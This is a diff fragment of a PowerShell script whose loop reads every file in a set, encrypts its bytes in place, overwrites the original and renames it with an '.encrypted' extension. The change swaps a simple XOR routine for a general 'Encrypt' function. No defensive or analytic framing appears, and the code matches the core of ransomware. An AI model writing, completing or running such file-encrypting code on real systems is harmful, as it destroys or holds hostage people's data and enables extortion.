@@ -85,7 +85,7 @@ foreach ($file in $files) {
     $filepath = $file.FullName
     $filename = $file.Name
     $filecontent = Get-Content -Path $filepath -Encoding Byte
-    $encrypted = Xor $filecontent
+    $encrypted = Encrypt $filecontent
     Set-Content -Path $filepath -Encoding Byte -Value $encrypted
     Rename-Item -Path $filepath -NewName "$filename.encrypted"
 }
